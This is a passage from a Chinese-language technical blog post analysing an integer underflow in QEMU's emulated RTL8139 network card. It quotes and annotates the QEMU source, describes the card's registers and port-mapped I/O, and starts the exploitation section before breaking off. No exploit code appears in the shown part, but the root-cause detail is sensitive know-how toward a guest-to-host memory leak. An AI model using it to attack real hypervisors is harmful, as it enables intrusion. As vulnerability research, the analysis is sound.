ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// saved_buffer 指向 Ethernet Frame, 这里读取 Length/Type 字段</span></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// Payload 为 IP Packet</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN; <span class="comment">// Payload 数据</span></span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; <span class="comment">// Payload 大小</span></span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;          <span class="comment">// IP Packet</span></span><br><span class="line">    <span class="comment">// 检查是否为 IPv4</span></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);            <span class="comment">// IP 头长度</span></span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        <span class="comment">// 计算 IP 数据包中数据的长度, 这里 ip_data_len 的类型为 uint16_t</span></span><br><span class="line">        <span class="comment">// 当 be16_to_cpu(ip-&gt;ip_len) &lt; hlen 触发整数溢出</span></span><br><span class="line">        <span class="comment">// ip_data_len 最大可以是 0xFFFF</span></span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里尝试从 Ethernet Frame 中解析 IPv4 数据包，在计算 IP 数据包中的数据长度时，在进行减法运算前并没有比较两个操作数的大小关系，通过触发整数溢出使得 <code>ip_data_len</code> 的最大值可以是 <code>0xFFFF</code> 。</p>
<p>紧接着是发送数据包，如果是 TCP 数据（ <code>IP_PROTO_TCP</code> ）且数据量过大（设置了 <code>CP_TX_LGSEN</code> 标记），则会进行分片处理，即切分成多个 IP 数据包进行发送；此时 <code>ip_data_len</code> 将被用于计算 <code>tcp_data_len</code> 的值：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pointer to TCP header */</span></span><br><span class="line">tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br></pre></td></tr></table></figure>
<p>随后对 <code>tcp_data_len</code> 长度的数据按照 <code>tcp_chunk_size</code> 的大小进行分片发送：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; </span><br><span class="line">     tcp_send_offset += tcp_chunk_size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">    <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, </span><br><span class="line">            (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">    &#123;</span><br><span class="line">        TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">    ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">    p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">    p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restore IP header */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">    ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">    ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">    ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里封装好的 Ethernet Frame 通过函数 <code>rtl8139_transfer_frame</code> 发送，函数部分代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，当设置了 <code>TxLoopBack</code> 标记时，会直接调用 <code>rtl8139_do_receive</code> 接收数据，数据会写入到接收缓冲区中。</p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="4-1-RTL8139-网卡简介"><a href="#4-1-RTL8139-网卡简介" class="headerlink" title="4.1 RTL8139 网卡简介"></a>4.1 RTL8139 网卡简介</h3><p>QEMU 模拟的 RTL8139 网卡在发送和接收数据时，内部代码分支的走向很大程度上依赖于网卡的状态，对应的结构体为 <code>RTL8139State</code> （位于文件 <code>hw\net\rtl8139.c</code> 中）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RTL8139State</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> phys[<span class="number">8</span>]; <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> mult[<span class="number">8</span>]; <span class="comment">/* multicast mask array */</span></span><br><span class="line">    <span class="comment">/* TxStatus0 in C mode*/</span> <span class="comment">/* also DTCCR[0] and DTCCR[1] in C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> TxStatus[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> TxAddr[<span class="number">4</span>];   <span class="comment">/* TxAddr0 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBuf;       <span class="comment">/* Receive buffer */</span></span><br><span class="line">    <span class="comment">/* internal variable, receive ring buffer size in C mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufferSize;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufPtr;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> IntrStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> IntrMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> TxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxMissed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CSCR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  Cfg9346;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config0;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config1;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config3;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config4;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  clock_enabled;</span><br><span class="line">    <span class="keyword">uint8_t</span>  bChipCmdState;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> MultiIntr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeCtrl;</span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayAdvert;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayLPAR;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayExpansion;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CpCmd;</span><br><span class="line">    <span class="keyword">uint8_t</span>  TxThresh;</span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C ring mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   currTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   cplus_enabled;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusRxDesc;</span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrLO;</span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrHI;</span><br><span class="line"></span><br><span class="line">    EEprom9346 eeprom;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   TCTR;</span><br><span class="line">    <span class="keyword">uint32_t</span>   TimerInt;</span><br><span class="line">    <span class="keyword">int64_t</span>    TCTR_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tally counters */</span></span><br><span class="line">    RTL8139TallyCounters tally_counters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Non-persistent data */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   *cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_len;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI interrupt timer */</span></span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line"></span><br><span class="line">    MemoryRegion bar_io;</span><br><span class="line">    MemoryRegion bar_mem;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Support migration to/from old versions */</span></span><br><span class="line">    <span class="keyword">int</span> rtl8139_mmio_io_addr_dummy;</span><br><span class="line">&#125; RTL8139State;</span><br></pre></td></tr></table></figure>
<p><code>RTL8139State</code> 结构体中的许多字段实际上就是 RTL8139 网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 Phrack 文章 [1] 提供的介绍（这里为 RTL8139 网卡在 C+ 模式下的寄存器介绍）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>TxConfig：发送数据相关的配置参数</li>
<li>RxConfig：接收数据相关的配置参数</li>
<li>CpCmd：C+ 模式相关配置参数，比如：<ul>
<li>CplusRxEnd 表示启用接收</li>
<li>CplusTxEnd 表示启用发送</li>
</ul>
</li>
<li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul>
<li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li>
<li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li>
</ul>
</li>
<li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li>
<li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li>
<li>TxPoll：让网卡检查 Tx descriptors</li>
</ul>
<p>关于 <code>Descriptor</code> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 <code>Transmit Descriptor</code> 的定义：</p>
<p><img src="/uploads/202006/transmit-descriptor.png" alt="RTL8139 网卡 Transmit Descriptor"></p>
<p>Phrack 文章 [1] 给出的结构体的定义如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="4-2-Port-Mapped-I-O"><a href="#4-2-Port-Mapped-I-O" class="headerlink" title="4.2 Port Mapped I/O"></a>4.2 Port Mapped I/O</h3><p>CPU 可以通过以下两种方式和外设进行交互（这里不讨论 IRQ、DMA 等其他交互方式）：</p>
<ul>
<li>Memory Mapped I/O 即 MMIO</li>
<li>Port Mapped I/O 即 PMIO</li>
</ul>
<p>MMIO 将外设的内存和寄存器直接映射到系统的地址空间中（这部分空间通常是保留给外设专用的），这样 CPU 通过普通的汇编指令即可和外设进行交互；而 PMIO 则将外设的内存和寄存器映射到隔离的地址空间中（PMIO 地址空间的大小为 64KB），CPU 通过 <code>in</code> 和 <code>out</code> 指令和外设进行交互。</p>
<p>在 Windows 下，可以通过设备管理器查看设备的 PMIO 地址范围，下图为 VMware SVGA 3D 的 PMIO 地址区间之一：</p>
<p><img src="/uploads/202006/vmware-svga-3d-pmio.png" alt="VMware SVGA 3D PMIO"></p>
<p>在 Linux 下可以使用 pciutils 中的 <code>lspci</code> 查看设备的 PMIO 地址区间 [9]，这里测试用的 Ubuntu Server 已经自带了 pciutils，只需要在启动时添加 RTL8139 网卡即可，启动命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback \</span><br><span class="line">    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">    -net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure>
<p>这里最后一行的作用是把 Ubuntu Server 虚拟机的 22 端口转发到主机的 2222 端口，方便主机通过 SSH 访问虚拟机（VNC Viewer 无法复制粘贴），在主机中执行以下命令即可连接虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh vmusername@127.0.0.1 -p 2222</span></span><br></pre></td></tr></table></figure>
<p>通过 <code>lspci</code> 命令可以看到 RTL8139 网卡的 PMIO 的起始地址为 <code>0xC000</code> ，大小为 <code>256</code> 字节：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci -s 00:04.0 -v</span></span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line">	Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">	Physical Slot: 4</span><br><span class="line">	Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">	I/O ports at c000 [size=256]</span><br><span class="line">	Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">	Expansion ROM at feb80000 [disabled] [size=256K]</span><br><span class="line">	Kernel driver in use: 8139cp</span><br><span class="line">	Kernel modules: 8139cp, 8139too</span><br></pre></td></tr></table></figure>
<h3 id="4-3-PMIO-读写"><a href="#4-3-PMIO-读写" class="headerlink" title="4.3 PMIO 读写"></a>4.3 PMIO 读写</h3><p>通过结构体 <code>RTL8139State</code> 的成员 <code>bar_io</code> 的交叉引用可以定位到函数 <code>pci_rtl8139_realize</code> ，这里对 PMIO 和 MMIO 进行了初始化操作：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_rtl8139_realize</span><span class="params">(PCIDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = RTL8139(dev);</span><br><span class="line">    DeviceState *d = DEVICE(dev);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pci_conf;</span><br><span class="line"></span><br><span class="line">    pci_conf = dev-&gt;config;</span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>;    <span class="comment">/* interrupt pin A */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> start of capability list, but no capability</span></span><br><span class="line"><span class="comment">     * list bit in status register, and offset 0xdc seems unused. */</span></span><br><span class="line">    pci_conf[PCI_CAPABILITY_LIST] = <span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_io, OBJECT(s), &amp;rtl8139_io_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_mem, OBJECT(s), &amp;rtl8139_mmio_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;bar_io);</span><br><span class="line">    pci_register_bar(dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;bar_mem);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span 